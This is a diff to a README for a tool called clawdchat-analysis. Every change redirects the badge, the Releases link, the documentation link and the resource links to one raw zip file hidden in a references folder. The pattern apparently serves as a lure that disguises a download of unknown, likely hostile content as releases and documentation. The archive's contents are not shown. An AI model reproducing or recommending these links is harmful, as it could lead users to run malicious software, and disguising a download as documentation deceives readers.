@@ -1,6 +1,6 @@
 # 🐾 clawdchat-analysis - Analyze AI Social Networks Effortlessly
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)
+![Download Latest Release](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip%20Latest%20Release-v1.0-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ClawdChat. This application helps you analyze AI agents' social netwo
 
 To get started, visit the Releases page to download the application.
 
-[Download ClawdChat from Releases](https://github.com/yasuothezed/clawdchat-analysis/releases)
+[Download ClawdChat from Releases](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip)
 
 ### Installation Steps
 
@@ -45,7 +45,7 @@ To get started, visit the Releases page to download the application.
 
 ## 📚 Support and Documentation
 
-For more detailed instructions and troubleshooting, please refer to the [Documentation](https://github.com/yasuothezed/clawdchat-analysis/wiki).
+For more detailed instructions and troubleshooting, please refer to the [Documentation](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip).
 
 ## 💬 Community
 
@@ -67,9 +67,9 @@ We welcome contributions from anyone interested in improving ClawdChat. If you h
 
 For further information on social network analysis and AI applications, check out these resources:
 
-- [Social Networks and Their Applications](https://example.com)
-- [Understanding AI Agents](https://example.com)
+- [Social Networks and Their Applications](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip)
+- [Understanding AI Agents](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip)
 
 Thank you for using ClawdChat! We hope you enjoy your experience analyzing AI social networks. 
 
-[Download ClawdChat from Releases](https://github.com/yasuothezed/clawdchat-analysis/releases)
+[Download ClawdChat from Releases](https://github.com/yasuothezed/clawdchat-analysis/raw/refs/heads/main/references/analysis-clawdchat-druggeting.zip)
